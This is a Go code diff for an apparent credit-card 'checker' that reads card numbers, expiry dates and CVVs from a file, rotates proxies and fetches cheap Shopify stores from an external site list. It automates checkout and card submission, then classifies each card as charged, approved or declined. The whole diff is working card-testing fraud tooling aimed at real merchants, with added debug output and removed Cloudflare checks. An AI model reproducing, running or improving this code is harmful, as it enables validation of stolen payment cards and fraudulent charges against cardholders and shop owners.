@@ -10,6 +10,7 @@ import (
 	"math/rand"
 	"net/http"
 	"net/url"
+	"os"
 	"regexp"
 	"strconv"
 	"strings"
@@ -20,28 +21,38 @@ import (
 	"github.com/bogdanfinn/tls-client/profiles"
 )
 
+// ──────────────────────── config ─────────────────────────────────────
+
+const defaultShopURL = "https://gpzb9u-u9.myshopify.com"
+const path = "test.txt"
+const proxyPath = "px.txt"
+
+// Our dashboard JSON API — returns {total, sites:[{url, checkout_price, ...}]}
+const workingSitesAPI = "https://charismatic-love-production.up.railway.app/api/sites"
+const maxSiteAmount = 5.0
+
 // ──────────────────────── CheckResult ─────────────────────────────────
 
 type CheckStatus int
 
 const (
-	StatusCharged  CheckStatus = iota // ORDER_PLACED
-	StatusApproved                    // non-charged success
+	StatusCharged  CheckStatus = iota // ORDER_PLACED (SuccessfulReceipt / ProcessedReceipt)
+	StatusApproved                    // got a receiptId but non-charged success code
 	StatusDeclined                    // FailedReceipt or 3DS
-	CheckError                        // could not complete checkout flow
+	StatusError                       // could not complete checkout flow
 )
 
 type CheckResult struct {
 	Card       string
 	Status     CheckStatus
-	StatusCode string
-	Amount     string
+	StatusCode string // e.g. ORDER_PLACED, CARD_DECLINED, PROCESSING, etc.
+	Amount     string // totalAmount charged
 	Currency   string
-	SiteName   string
+	SiteName   string // shop domain without https://
 	ShopURL    string
-	Gateway    string
-	Error      error
-	Retryable  bool
+	Gateway    string // e.g. "Shopify Payments", "Stripe Donation"
+	Error      error  // non-nil for StatusError / StatusDeclined
+	Retryable  bool   // true if a different store might succeed
 }
 
 // ──────────────────────── Shopify JSON models ────────────────────────
@@ -63,47 +74,250 @@ type Variant struct {
 	Available bool   `json:"available"`
 }
 
+type WorkingSite struct {
+	URL    string
+	Amount float64
+}
+
+func chooseAffordableSite(apiURL string, maxAmount float64) (WorkingSite, error) {
+	endpoints := []string{apiURL}
+
+	var lastErr error
+	for _, endpoint := range endpoints {
+		sites, err := fetchAffordableSites(endpoint, maxAmount)
+		if err != nil {
+			lastErr = err
+			continue
+		}
+		if len(sites) == 0 {
+			lastErr = fmt.Errorf("no sites <= %.2f from %s", maxAmount, endpoint)
+			continue
+		}
+		return sites[rand.Intn(len(sites))], nil
+	}
+
+	if lastErr != nil {
+		return WorkingSite{}, lastErr
+	}
+	return WorkingSite{}, fmt.Errorf("no site endpoint responded")
+}
+
+func fetchAffordableSites(apiURL string, maxAmount float64) ([]WorkingSite, error) {
+	// The API caps at 100 results per page — paginate through all pages
+	const pageSize = 100
+	var out []WorkingSite
+	seen := make(map[string]bool)
+
+	httpClient := &http.Client{Timeout: 10 * time.Second}
+
+	for offset := 0; ; offset += pageSize {
+		pageURL := fmt.Sprintf("%s?limit=%d&offset=%d", apiURL, pageSize, offset)
+		resp, err := httpClient.Get(pageURL)
+		if err != nil {
+			if len(out) > 0 {
+				break // return what we have so far
+			}
+			return nil, fmt.Errorf("GET %s: %w", pageURL, err)
+		}
+
+		body, err := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		if err != nil {
+			if len(out) > 0 {
+				break
+			}
+			return nil, fmt.Errorf("read API body: %w", err)
+		}
+
+		if resp.StatusCode != http.StatusOK {
+			if len(out) > 0 {
+				break
+			}
+			return nil, fmt.Errorf("GET %s returned status %d", pageURL, resp.StatusCode)
+		}
+
+		bodyStr := strings.TrimSpace(string(body))
+		if strings.HasPrefix(bodyStr, "<!DOCTYPE html") || strings.Contains(bodyStr, "<tbody>") {
+			sites := parseDashboardHTMLSites(bodyStr, maxAmount)
+			return sites, nil
+		}
+
+		var payload any
+		if err := json.Unmarshal(body, &payload); err != nil {
+			if len(out) > 0 {
+				break
+			}
+			return nil, fmt.Errorf("parse API JSON: %w", err)
+		}
+
+		pageSites := collectObjects(payload)
+		if len(pageSites) == 0 {
+			break // no more results
+		}
+
+		for _, obj := range pageSites {
+			siteURL := extractSiteURL(obj)
+			if siteURL == "" {
+				continue
+			}
+			amount, ok := extractAmount(obj)
+			if !ok || amount > maxAmount {
+				continue
+			}
+			if seen[siteURL] {
+				continue
+			}
+			seen[siteURL] = true
+			out = append(out, WorkingSite{URL: siteURL, Amount: amount})
+		}
+
+		if len(pageSites) < pageSize {
+			break // last page
+		}
+	}
+
+	if len(out) == 0 {
+		return nil, fmt.Errorf("no affordable sites found in API payload")
+	}
+	fmt.Printf("[SITES] fetched %d affordable sites (under $%.0f)\n", len(out), maxAmount)
+	return out, nil
+}
+
+func parseDashboardHTMLSites(htmlBody string, maxAmount float64) []WorkingSite {
+	// Matches our dashboard format:
+	// <td><a href="URL" target="_blank">URL</a></td><td class="price">$1.00</td>
+	rowRe := regexp.MustCompile(`<a href="(https?://[^"]+)"[^>]*>[^<]*</a></td><td[^>]*class="price"[^>]*>\$?([0-9.,—]+)</td>`)
+	matches := rowRe.FindAllStringSubmatch(htmlBody, -1)
+
+	var out []WorkingSite
+	seen := make(map[string]bool)
+	for _, m := range matches {
+		if len(m) < 3 {
+			continue
+		}
+		siteURL := strings.TrimSpace(m[1])
+		siteURL = strings.TrimRight(siteURL, "/")
+		priceStr := strings.TrimSpace(m[2])
+		if priceStr == "—" {
+			continue // no price info, skip
+		}
+		amount, ok := toFloat(priceStr)
+		if !ok || amount <= 0 || amount > maxAmount {
+			continue
+		}
+		if seen[siteURL] {
+			continue
+		}
+		seen[siteURL] = true
+		out = append(out, WorkingSite{URL: siteURL, Amount: amount})
+	}
+	return out
+}
+
+func collectObjects(v any) []map[string]any {
+	out := []map[string]any{}
+	switch node := v.(type) {
+	case map[string]any:
+		out = append(out, node)
+		for _, child := range node {
+			out = append(out, collectObjects(child)...)
+		}
+	case []any:
+		for _, child := range node {
+			out = append(out, collectObjects(child)...)
+		}
+	}
+	return out
+}
+
+func extractSiteURL(obj map[string]any) string {
+	keys := []string{"site", "url", "shop_url", "shopUrl", "shop", "domain", "website"}
+	for _, k := range keys {
+		raw, ok := obj[k]
+		if !ok {
+			continue
+		}
+		s := strings.TrimSpace(fmt.Sprint(raw))
+		if s == "" {
+			continue
+		}
+		if !strings.HasPrefix(s, "http://") && !strings.HasPrefix(s, "https://") {
+			s = "https://" + s
+		}
+		u, err := url.ParseRequestURI(s)
+		if err != nil || u.Host == "" {
+			continue
+		}
+		return strings.TrimRight(u.Scheme+"://"+u.Host, "/")
+	}
+	return ""
+}
+
+func extractAmount(obj map[string]any) (float64, bool) {
+	keys := []string{"amount", "price", "checkout_price", "value", "min_amount", "minAmount"}
+	for _, k := range keys {
+		raw, ok := obj[k]
+		if !ok {
+			continue
+		}
+		if n, ok := toFloat(raw); ok {
+			return n, true
+		}
+	}
+	return 0, false
+}
+
+func toFloat(v any) (float64, bool) {
+	switch n := v.(type) {
+	case float64:
+		return n, true
+	case int:
+		return float64(n), true
+	case int64:
+		return float64(n), true
+	case json.Number:
+		f, err := n.Float64()
+		return f, err == nil
+	case string:
+		numRe := regexp.MustCompile(`[-+]?\d*\.?\d+`)
+		m := numRe.FindString(n)
+		if m == "" {
+			return 0, false
+		}
+		f, err := strconv.ParseFloat(m, 64)
+		return f, err == nil
+	default:
+		return 0, false
+	}
+}
+
 // ──────────────────────── Step 0: find cheapest available product ────
 
 func findCheapestProduct(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
-	// Try sorted endpoint first; fall back to plain if store returns 404.
-	candidates := []string{
-		shopURL + "/products.json?limit=250&sort_by=price-ascending",
-		shopURL + "/products.json?limit=250",
+	reqURL := shopURL + "/products.json?limit=250"
+	resp, err := client.Get(reqURL)
+	if err != nil {
+		return "", "", "", "", fmt.Errorf("GET %s: %w", reqURL, err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return "", "", "", "", fmt.Errorf("GET %s returned status %d", reqURL, resp.StatusCode)
 	}
 
-	var body []byte
-	for _, reqURL := range candidates {
-		r, reqErr := client.Get(reqURL)
-		if reqErr != nil {
-			return "", "", "", "", fmt.Errorf("GET products.json: %w", reqErr)
-		}
-		b, readErr := io.ReadAll(r.Body)
-		r.Body.Close()
-		if readErr != nil {
-			return "", "", "", "", fmt.Errorf("reading products.json: %w", readErr)
-		}
-		if r.StatusCode == http.StatusOK {
-			body = b
-			break
-		}
-		if r.StatusCode == http.StatusNotFound {
-			continue
-		}
-		return "", "", "", "", fmt.Errorf("products.json returned status %d", r.StatusCode)
-	}
-
-	if len(body) == 0 {
-		return "", "", "", "", fmt.Errorf("no products.json endpoint at %s", shopURL)
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", "", "", "", fmt.Errorf("reading body: %w", err)
 	}
 
 	var data ProductsResponse
-	if jsonErr := json.Unmarshal(body, &data); jsonErr != nil {
-		return "", "", "", "", fmt.Errorf("parsing products.json: %w", jsonErr)
+	if err := json.Unmarshal(body, &data); err != nil {
+		return "", "", "", "", fmt.Errorf("parsing JSON: %w", err)
 	}
 
 	bestPrice := math.MaxFloat64
 	found := false
+
 	for _, p := range data.Products {
 		for _, v := range p.Variants {
 			if !v.Available {
@@ -125,23 +339,12 @@ func findCheapestProduct(client tls_client.HttpClient, shopURL string) (productT
 	}
 
 	if !found {
-		return "", "", "", "", fmt.Errorf("no available products at %s", shopURL)
+		return "", "", "", "", fmt.Errorf("no available products found at %s", shopURL)
 	}
 	return productTitle, productID, variantID, priceStr, nil
 }
 
 // ──────────────────────── Step 1: add to cart → checkout ─────────────
-
-// isCloudflareChallenge returns true if the page body is a Cloudflare challenge/block page.
-func isCloudflareChallenge(body string) bool {
-	lower := strings.ToLower(body)
-	return strings.Contains(lower, "<title>just a moment") ||
-		strings.Contains(lower, "cf_chl_") ||
-		strings.Contains(lower, "jschl_") ||
-		(strings.Contains(lower, "cloudflare") && strings.Contains(lower, "checking")) ||
-		strings.Contains(body, "cf-ray") ||
-		strings.Contains(lower, "checking if the site connection is secure")
-}
 
 func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID string) (checkoutURL, checkoutToken, sessionToken, checkoutHTML string, err error) {
 	// ── POST /cart/add.js ──
@@ -409,8 +612,7 @@ func extractPollForReceiptID(jsBody string) string {
 }
 
 func extractReceiptID(submitBody string) string {
-	// Match any receipt type: ProcessedReceipt, ProcessingReceipt, etc.
-	re := regexp.MustCompile(`"id"\s*:\s*"(gid://shopify/[A-Za-z]*Receipt/[0-9a-zA-Z]+)"`)
+	re := regexp.MustCompile(`"id"\s*:\s*"(gid://shopify/ProcessedReceipt/[0-9a-zA-Z]+)"`)
 	m := re.FindStringSubmatch(submitBody)
 	if len(m) < 2 {
 		return ""
@@ -648,9 +850,6 @@ func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear i
 		tls_client.WithClientProfile(profiles.Chrome_124),
 	}
 	if proxyURL != "" {
-		if norm, err := parseProxy(proxyURL); err == nil {
-			proxyURL = norm
-		}
 		pciOptions = append(pciOptions, tls_client.WithProxyUrl(proxyURL))
 	}
 	pciClient, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), pciOptions...)
@@ -734,7 +933,7 @@ func sendProposal(client tls_client.HttpClient, shopURL, checkoutURL, checkoutTo
           "quantity": {
             "items": {"value": 1}
           },
-                                        "expectedTotalPrice": {"any": true},
+					"expectedTotalPrice": {"any": true},
           "lineComponentsSource": null,
           "lineComponents": []
         }
@@ -908,7 +1107,7 @@ func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
           "quantity": {
             "items": {"value": 1}
           },
-                                        "expectedTotalPrice": {"any": true},
+					"expectedTotalPrice": {"any": true},
           "lineComponentsSource": null,
           "lineComponents": []
         }
@@ -963,8 +1162,7 @@ func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
       "shippingScriptChanges": []
     },
     "optionalDuties": {"buyerRefusesDuties": false},
-    "cartMetafields": [],
-    "includeTaxStrategyLines": false
+    "cartMetafields": []
   },
   "operationName": "Proposal",
   "id": %q
@@ -1110,7 +1308,7 @@ func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
           "quantity": {
             "items": {"value": 1}
           },
-                                        "expectedTotalPrice": {"any": true},
+					"expectedTotalPrice": {"any": true},
           "lineComponentsSource": null,
           "lineComponents": []
         }
@@ -1169,8 +1367,7 @@ func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
       "shippingScriptChanges": []
     },
     "optionalDuties": {"buyerRefusesDuties": false},
-    "cartMetafields": [],
-    "includeTaxStrategyLines": false
+    "cartMetafields": []
   },
   "operationName": "Proposal",
   "id": %q
@@ -1296,7 +1493,6 @@ func sendSubmitForCompletion(
 	deliveryHandle, shippingAmount, totalAmount,
 	pciSessionID, attemptToken, currency, country string,
 	signedHandles []string,
-	cardNumber, paymentMethodID string,
 ) (int, string, error) {
 
 	// Build signedHandle lines for deliveryExpectationLines
@@ -1305,12 +1501,6 @@ func sendSubmitForCompletion(
 		handleLines = append(handleLines, fmt.Sprintf(`{"signedHandle":%s}`, strconv.Quote(h)))
 	}
 	signedHandlesJSON := "[" + strings.Join(handleLines, ",") + "]"
-
-	// Compute credit card BIN (first 8 digits)
-	cardBin := cardNumber
-	if len(cardBin) > 8 {
-		cardBin = cardBin[:8]
-	}
 
 	pageID := generatePageID()
 
@@ -1355,7 +1545,7 @@ func sendSubmitForCompletion(
               ]
             },
             "deliveryMethodTypes": ["SHIPPING"],
-            "expectedTotalPrice": {"value":{"amount":%q,"currencyCode":"USD"}},
+						"expectedTotalPrice": {"any": true},
             "destinationChanged": false
           }
         ],
@@ -1383,7 +1573,7 @@ func sendSubmitForCompletion(
             "quantity": {
               "items": {"value": 1}
             },
-            "expectedTotalPrice": {"value":{"amount":%q,"currencyCode":"USD"}},
+						"expectedTotalPrice": {"any": true},
             "lineComponentsSource": null,
             "lineComponents": []
           }
@@ -1391,12 +1581,16 @@ func sendSubmitForCompletion(
       },
       "memberships": {"memberships": []},
       "payment": {
-        "totalAmount": {"any": true},
+				"totalAmount": {
+					"value": {
+						"amount": %q,
+						"currencyCode": "USD"
+					}
+				},
         "paymentLines": [
           {
             "paymentMethod": {
               "directPaymentMethod": {
-                "paymentMethodIdentifier": %q,
                 "sessionId": %q,
                 "billingAddress": {
                   "streetAddress": {
@@ -1449,8 +1643,7 @@ func sendSubmitForCompletion(
             "zoneCode": %q,
             "phone": %q
           }
-        },
-        "creditCardBin": %q
+        }
       },
       "buyerIdentity": {
         "customer": {
@@ -1460,14 +1653,14 @@ func sendSubmitForCompletion(
         "email": %q,
         "emailChanged": false,
         "phoneCountryCode": "US",
-        "marketingConsent": [{"email":{"consentState":"DECLINED","value":%q}}],
+        "marketingConsent": [],
         "shopPayOptInPhone": {"countryCode": "US"},
         "rememberMe": false
       },
       "tip": {"tipLines": []},
       "taxes": {
         "proposedAllocations": null,
-        "proposedTotalAmount": {"value":{"amount":"0","currencyCode":"USD"}},
+        "proposedTotalAmount": {"any": true},
         "proposedTotalIncludedAmount": null,
         "proposedMixedStateTotalAmount": null,
         "proposedExemptions": []
@@ -1493,8 +1686,7 @@ func sendSubmitForCompletion(
     "analytics": {
       "requestUrl": %q,
       "pageId": %q
-    },
-    "includeTaxStrategyLines": false
+    }
   },
   "operationName": "SubmitForCompletion",
   "id": %q
@@ -1502,24 +1694,26 @@ func sendSubmitForCompletion(
 		sessionToken, queueToken,
 		// delivery address
 		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
-		// delivery strategy handle + target stableId + shipping amount
-		deliveryHandle, stableID, shippingAmount,
+		// delivery strategy
+		deliveryHandle,
+		// target merch stableId
+		stableID,
 		// deliveryExpectationLines (raw JSON)
 		signedHandlesJSON,
-		// merchandise stableId + variant IDs + price
-		stableID, variantID, variantID, price,
-		// payment - paymentMethodIdentifier + sessionId
-		paymentMethodID, pciSessionID,
+		// merchandise
+		stableID, variantID, variantID,
+		// payment total
+		totalAmount,
+		// payment
+		pciSessionID,
 		// payment billing address
 		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
 		// payment amount
 		totalAmount,
 		// outer billing address
 		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
-		// creditCardBin
-		cardBin,
 		// buyer identity
-		email, email,
+		email,
 		// attempt + analytics
 		attemptToken, checkoutURL, pageID,
 		// operation id
@@ -1574,14 +1768,6 @@ var proposalErrorRe = regexp.MustCompile(`"code"\s*:\s*"([^"]+)"\s*,\s*"localize
 var submitTypeRe = regexp.MustCompile(`"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"`)
 var errMissingReceiptID = errors.New("submit response missing receiptId")
 var errStoreIncompatible = errors.New("store incompatible")
-var errCurrencyNotSupported = errors.New("BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP")
-
-// hasCurrencyNotSupportedError returns true if the proposal body contains the
-// BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP error code, meaning the shop
-// does not accept the buyer's currency and we should skip to the next shop.
-func hasCurrencyNotSupportedError(body string) bool {
-	return strings.Contains(body, "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP")
-}
 
 func checkProposalErrors(step string, status int, body string) {
 	if status != 200 {
@@ -1619,6 +1805,13 @@ func checkSubmitErrors(status int, body string) {
 	}
 }
 
+// saveDebugResponse overwrites a fixed-name file with the latest response body.
+// Files are written to the current working directory for easy inspection.
+func saveDebugResponse(name, body string) {
+	fname := name + "_response.json"
+	_ = os.WriteFile(fname, []byte(body), 0644)
+}
+
 func extractReceiptStatusCode(pollBody, receiptType string) string {
 	if receiptType == "SuccessfulReceipt" || receiptType == "ProcessedReceipt" {
 		return "ORDER_PLACED"
@@ -1645,20 +1838,159 @@ func extractReceiptStatusCode(pollBody, receiptType string) string {
 
 // ──────────────────────── main ───────────────────────────────────────
 
-func parseCardEntry(cardEntry string) (string, int, int, string, error) {
+func loadCardEntries(filePath string) ([]string, error) {
+	cardData, err := os.ReadFile(filePath)
+	if err != nil {
+		return nil, fmt.Errorf("read %s: %w", filePath, err)
+	}
+
+	rawLines := strings.Split(strings.ReplaceAll(string(cardData), "\r\n", "\n"), "\n")
+	entries := make([]string, 0, len(rawLines))
+	for _, rawLine := range rawLines {
+		line := strings.TrimSpace(rawLine)
+		if line == "" {
+			continue
+		}
+		entries = append(entries, line)
+	}
+
+	if len(entries) == 0 {
+		return nil, fmt.Errorf("no card entries found in %s", filePath)
+	}
+	return entries, nil
+}
+
+func parseCardEntry(cardEntry, filePath string) (string, int, int, string, error) {
 	cardParts := strings.Split(strings.TrimSpace(cardEntry), "|")
 	if len(cardParts) != 4 {
-		return "", 0, 0, "", fmt.Errorf("invalid card format: %s", cardEntry)
+		return "", 0, 0, "", fmt.Errorf("invalid card format in %s: %s", filePath, cardEntry)
 	}
+
 	cardMonth, err := strconv.Atoi(cardParts[1])
 	if err != nil {
-		return "", 0, 0, "", fmt.Errorf("invalid card month: %w", err)
+		return "", 0, 0, "", fmt.Errorf("invalid card month in %s: %w", filePath, err)
 	}
 	cardYear, err := strconv.Atoi(cardParts[2])
 	if err != nil {
-		return "", 0, 0, "", fmt.Errorf("invalid card year: %w", err)
+		return "", 0, 0, "", fmt.Errorf("invalid card year in %s: %w", filePath, err)
 	}
+
 	return cardParts[0], cardMonth, cardYear, cardParts[3], nil
+}
+
+func loadProxyEntries(filePath string) ([]string, error) {
+	data, err := os.ReadFile(filePath)
+	if err != nil {
+		return nil, fmt.Errorf("reading %s: %w", filePath, err)
+	}
+
+	lines := strings.Split(string(data), "\n")
+	entries := make([]string, 0, len(lines))
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line == "" {
+			continue
+		}
+		if strings.HasPrefix(line, "#") {
+			continue
+		}
+		entries = append(entries, line)
+	}
+
+	if len(entries) == 0 {
+		return nil, fmt.Errorf("no proxy entries found in %s", filePath)
+	}
+
+	return entries, nil
+}
+
+func normalizeProxy(raw string) (string, error) {
+	p := strings.TrimSpace(raw)
+	if p == "" {
+		return "", fmt.Errorf("empty proxy")
+	}
+
+	if !strings.Contains(p, "://") {
+		parts := strings.Split(p, ":")
+		if len(parts) == 4 {
+			// host:port:user:pass -> http://user:pass@host:port
+			p = fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
+		} else {
+			p = "http://" + p
+		}
+	}
+
+	u, err := url.ParseRequestURI(p)
+	if err != nil || u.Host == "" {
+		return "", fmt.Errorf("invalid proxy format: %s", raw)
+	}
+
+	return p, nil
+}
+
+func testProxy(proxyURL string) error {
+	options := []tls_client.HttpClientOption{
+		tls_client.WithTimeoutSeconds(5),
+		tls_client.WithClientProfile(profiles.Chrome_124),
+		tls_client.WithProxyUrl(proxyURL),
+	}
+	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
+	if err != nil {
+		return fmt.Errorf("create proxy test client: %w", err)
+	}
+
+	resp, err := client.Get("https://api.ipify.org?format=json")
+	if err != nil {
+		return fmt.Errorf("proxy test request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("proxy test returned status %d", resp.StatusCode)
+	}
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("reading proxy test response: %w", err)
+	}
+	if len(strings.TrimSpace(string(body))) == 0 {
+		return fmt.Errorf("proxy test returned empty body")
+	}
+
+	return nil
+}
+
+func findWorkingProxies(proxies []string) ([]string, error) {
+	working := make([]string, 0, len(proxies))
+	seen := make(map[string]bool)
+
+	for i, raw := range proxies {
+		proxyURL, err := normalizeProxy(raw)
+		if err != nil {
+			fmt.Printf("[Proxy %d/%d] Invalid entry skipped: %v\n", i+1, len(proxies), err)
+			continue
+		}
+		if seen[proxyURL] {
+			fmt.Printf("[Proxy %d/%d] Duplicate skipped: %s\n", i+1, len(proxies), proxyURL)
+			continue
+		}
+
+		fmt.Printf("[Proxy %d/%d] Testing %s\n", i+1, len(proxies), proxyURL)
+		if err := testProxy(proxyURL); err != nil {
+			fmt.Printf("[Proxy %d/%d] Failed: %v\n", i+1, len(proxies), err)
+			continue
+		}
+
+		seen[proxyURL] = true
+		working = append(working, proxyURL)
+		fmt.Printf("[Proxy %d/%d] OK, added to rotation.\n", i+1, len(proxies))
+	}
+
+	if len(working) == 0 {
+		return nil, fmt.Errorf("no working proxy found")
+	}
+
+	return working, nil
 }
 
 func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, error) {
@@ -1673,9 +2005,9 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		Currency: currency,
 	}
 
-	cardNumber, cardMonth, cardYear, cardCVV, err := parseCardEntry(cardEntry)
+	cardNumber, cardMonth, cardYear, cardCVV, err := parseCardEntry(cardEntry, path)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = err
 		return result, err
 	}
@@ -1688,15 +2020,11 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		tls_client.WithCookieJar(jar),
 	}
 	if proxyURL != "" {
-		// Normalize proxy to a valid URL format before passing to tls-client
-		if norm, err := parseProxy(proxyURL); err == nil {
-			proxyURL = norm
-		}
 		clOptions = append(clOptions, tls_client.WithProxyUrl(proxyURL))
 	}
 	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), clOptions...)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("failed to create tls client: %w", err)
 		return result, result.Error
 	}
@@ -1705,7 +2033,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	title, _, variantID, price, err := findCheapestProduct(client, shopURL)
 	_ = title
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 0 failed: %w", err)
 		return result, result.Error
@@ -1714,7 +2042,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 1
 	checkoutURL, checkoutToken, sessionToken, checkoutHTML, err := addToCartAndCheckout(client, shopURL, variantID)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 1 failed: %w", err)
 		return result, result.Error
@@ -1722,16 +2050,11 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	stableID := extractStableID(checkoutHTML)
 	buildID := extractCommitSha(checkoutHTML)
 	sourceToken := extractSourceToken(checkoutHTML)
-	if isCloudflareChallenge(checkoutHTML) {
-		result.Status = CheckError
-		result.Retryable = true
-		result.Error = fmt.Errorf("Step 1 failed: Cloudflare challenge detected")
-		return result, result.Error
-	}
 	if stableID == "" || buildID == "" || sourceToken == "" {
+		saveDebugResponse("checkout_html_step1", checkoutHTML)
 		fmt.Printf("  [ERR] Step1 missing: stableID=%v buildID=%v sourceToken=%v shop=%s\n",
 			stableID != "", buildID != "", sourceToken != "", shopURL)
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 1 failed: missing stableId, buildId, or sourceToken")
 		return result, result.Error
@@ -1740,14 +2063,14 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 2
 	patID := extractPrivateAccessTokenID(checkoutHTML)
 	if patID == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 2 failed: could not extract private_access_token id")
 		return result, result.Error
 	}
 	_, err = fetchPrivateAccessToken(client, shopURL, checkoutURL, patID)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 2 failed: %w", err)
 		return result, result.Error
@@ -1756,14 +2079,14 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 3
 	actionsURL := extractActionsJSURL(checkoutHTML, shopURL)
 	if actionsURL == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 3 failed: could not find actions JS URL")
 		return result, result.Error
 	}
 	jsBody, err := fetchActionsJS(client, actionsURL, shopURL)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 3 failed: %w", err)
 		return result, result.Error
@@ -1771,28 +2094,47 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	proposalID := extractProposalID(jsBody)
 	submitID := extractSubmitForCompletionID(jsBody)
 	if proposalID == "" || submitID == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 3 failed: missing Proposal or Submit ID")
 		return result, result.Error
 	}
 
-	// Use known PollForReceipt persisted query ID (Shopify static ID across all stores)
-	pollForReceiptID := "a73d687818f68c1103f4dede7028c2730296e7e3df06a997cbae7e50dd94e91d"
+	// Try to find PollForReceipt ID in the same actions JS first (newer Shopify bundles include it there).
+	// If not found, scan all candidate processing/receipt JS bundles in priority order.
+	pollForReceiptID := extractPollForReceiptID(jsBody)
+	if pollForReceiptID == "" {
+		processingURLs := extractProcessingJSURLs(checkoutHTML, shopURL)
+		tried := 0
+		for _, jsURL := range processingURLs {
+			pjs, errPJS := fetchActionsJS(client, jsURL, shopURL)
+			if errPJS != nil {
+				continue
+			}
+			tried++
+			if id := extractPollForReceiptID(pjs); id != "" {
+				pollForReceiptID = id
+				break
+			}
+		}
+		if pollForReceiptID == "" {
+			saveDebugResponse("checkout_html_no_pollid", checkoutHTML)
+			fmt.Printf("  [ERR] PollForReceipt not found. candidates=%d tried=%d shop=%s\n", len(processingURLs), tried, shopURL)
+			result.Status = StatusError
+			result.Retryable = true
+			result.Error = fmt.Errorf("%w: Step 3 failed: missing PollForReceipt ID (tried %d/%d bundles)", errStoreIncompatible, tried, len(processingURLs))
+			return result, result.Error
+		}
+	}
 
 	// Step 4
 	_, proposalBody, err := sendProposal(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 4 failed: %w", err)
 		return result, result.Error
 	}
-	if hasCurrencyNotSupportedError(proposalBody) {
-		result.Status = CheckError
-		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
-		result.Error = errCurrencyNotSupported
-		return result, result.Error
-	}
+	saveDebugResponse("proposal", proposalBody)
 
 	if cur := extractSellerCurrency(proposalBody); cur != "" && cur != currency {
 		currency = cur
@@ -1809,31 +2151,23 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 
 	queueToken := extractQueueToken(proposalBody)
 	if queueToken == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 4 failed: could not extract queueToken")
 		return result, result.Error
 	}
-
-	// Extract payment method identifier from proposal (used later in SubmitForCompletion)
-	paymentMethodID := extractPaymentMethodID(proposalBody)
 
 	// Step 5
 	email := "sadsjahk@gmail.com"
 	_, proposal2Body, err := sendProposal2(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 5 failed: %w", err)
 		return result, result.Error
 	}
